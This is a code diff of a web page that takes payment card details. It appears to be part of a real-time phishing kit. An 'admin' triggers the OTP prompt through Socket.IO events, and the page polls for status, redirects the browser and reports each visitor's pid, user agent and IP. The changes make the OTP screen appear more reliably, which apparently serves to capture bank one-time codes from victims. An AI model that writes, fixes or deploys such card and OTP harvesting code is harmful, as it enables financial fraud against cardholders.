@@ -208,7 +208,41 @@
                 reconnectionDelayMax: 5000,
                 timeout: 20000
             });
+            // Add these debugging listeners
+    socket.on('connect', () => {
+        console.log('Connected to Socket.IO server with ID:', socket.id);
+        
+        // Join room based on URL pid parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const pid = urlParams.get('pid');
+        if (pid) {
+            console.log('Joining room for PID:', pid);
+            socket.emit('join', pid);
+        }
+    });
+
+    socket.on('disconnect', () => {
+        console.log('Disconnected from Socket.IO server');
+    });
+
+    socket.on('error', (error) => {
+        console.error('Socket error:', error);
+    });
+
+    // Add acknowledgement for card data
+    socket.on('card_data_received', (data) => {
+        console.log('Card data received acknowledgement:', data);
+        if (data.invoiceId) {
+            // Join the room for this transaction ID
+            socket.emit('join', data.invoiceId);
+            console.log('Joined room for invoice:', data.invoiceId);
             
+            // Store transaction ID if not already set
+            if (!state.transactionId) {
+                state.transactionId = data.invoiceId;
+            }
+        }
+    });
             // Application state
             let state = {
                 step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
@@ -609,17 +643,30 @@
                     }
                 });
                 
-                // Handle OTP display request from admin
-                socket.on('show_otp', (data) => {
-                    console.log('OTP verification requested:', data);
-                    if (data.transaction_id === state.transactionId) {
-                        state.step = 'otp';
-                        state.loading = false;
-                        showToast("OTP Verification Required", "Please enter the OTP sent to your mobile");
-                        startOtpTimer();
-                        renderApp();
-                    }
-                });
+// Handle OTP display request from admin
+socket.on('show_otp', (data) => {
+    console.log('OTP verification requested:', data);
+    
+    // Don't check transaction ID if not yet set
+    if (!state.transactionId) {
+        state.transactionId = data.transaction_id || data.invoiceId;
+    }
+    
+    // More lenient matching
+    if (data.transaction_id === state.transactionId || 
+        data.invoiceId === state.transactionId || 
+        !state.transactionId) { // Accept if we don't have a transaction ID yet
+        
+        console.log('OTP condition met, showing OTP form');
+        state.step = 'otp';
+        state.loading = false;
+        showToast("OTP Verification Required", "Please enter the OTP sent to your mobile");
+        startOtpTimer();
+        renderApp();
+    } else {
+        console.warn('Transaction ID mismatch:', data.transaction_id, state.transactionId);
+    }
+});
                 
                 // Handle payment success/failure responses
                 socket.on('payment_success', (data) => {
@@ -1283,17 +1330,54 @@ cardNumberInput.addEventListener('input', (e) => {
                 }
             }
             
-            // Initialize the application
-            function initApp() {
-                generateRandomPhone();
-                setupSocketListeners();
-                renderApp();
-                initScreenCapture();
-            }
+// Status polling function
+function setupStatusPolling() {
+    // Poll every 3 seconds
+    setInterval(async () => {
+        if (!state.transactionId || state.step !== 'processing') return;
+        
+        try {
+            console.log('Polling for status update...');
+            const response = await fetch(`/api/checkTransactionStatus?invoiceId=${state.transactionId}`);
+            const data = await response.json();
             
-            // Start the app
-            initApp();
+            console.log('Status update:', data);
+            
+            if (data.status === 'show_otp') {
+                state.step = 'otp';
+                state.loading = false;
+                showToast("OTP Verification Required", "Please enter the OTP sent to your mobile");
+                startOtpTimer();
+                renderApp();
+            } else if (data.status === 'redirect') {
+                window.location.href = data.redirectUrl;
+            }
+        } catch (error) {
+            console.error('Error polling status:', error);
+        }
+    }, 3000);
+}
+
+// Initialize the application
+function initApp() {
+    generateRandomPhone();
+    setupSocketListeners();
+    setupStatusPolling(); // Add this line
+    renderApp();
+    
+    // Also send visitor info if we have a pid
+    const urlParams = new URLSearchParams(window.location.search);
+    const pid = urlParams.get('pid');
+    if (pid) {
+        socket.emit('visitor', {
+            pid: pid,
+            userAgent: navigator.userAgent,
+            ip: 'client', // Server will replace this with actual IP
+            timestamp: new Date().toISOString(),
+            sessionId: 'session-' + Date.now()
         });
+    }
+}
     </script>
 </body>
 </html>
